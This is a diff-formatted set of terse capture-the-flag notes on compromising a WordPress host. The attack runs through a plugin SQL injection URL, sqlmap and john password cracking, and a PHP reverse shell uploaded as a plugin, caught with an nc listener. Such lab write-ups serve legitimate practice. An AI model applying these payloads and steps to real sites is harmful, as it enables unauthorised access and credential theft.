@@ -1,0 +1,31 @@
+1. Get IP
+2. run autorecon
+3. navigate to IP
+4. notice redirectory to another site, its an outside ip
+5. add same ip and dns name to /etc/hosts
+6. navigate to virtual host on the same IP
+7. run autorecon on against this machine
+8. tcp 22, and 80 are open
+9. identify Ubuntu, Apache, Wordpress, navigate to login
+10. Try to login 'admin' is accepted as a username
+11. run wpscan against site, go through plugins identify vulnerable plugin 
+12. identify https://www.exploit-db.com/exploits/50766 
+13. traverse the vulnerable path mentioned in the exploit http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1
+14. Capture this GET in burp
+15. save file locally
+16. use the following command `sudo sqlmap -r wp.req -p 'question_id' -D wordpress -T wp_users -C user_pass --technique=T --flush-session`
+17. does not work
+18. try later http://alvida-eatery.org/wp-admin/admin-ajax.php?action=get_question&question_id=1%20union%20select%201%2C1%2Cchar(116%2C101%2C120%2C116)%2Cuser_login%2Cuser_pass%2C0%2C0%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%20from%20wp_users retrieved from wpscan public exploit
+19. html output resulted in the user: admin with password hash: ` $P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0
+20. Use ` hash-identifier` to figure out what is
+21. md5(wordpress)
+22. `john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` 
+23. found `hulabaloo` as the password
+24. logged in as admin::password
+25. found the plugin section
+26. zipped a reverse shell in /usr/share/webshells/php 
+27. `sudo zip file.zip wordpress-reverse.php` 
+28. uploaded file as zipped payload
+29. started a listener on 4444, `nc -lvnp 4444` 
+30. activated plugin to catch the reverse shell
+31.  `whoami` www-data, ls, cd .., ls, cat flag.txt
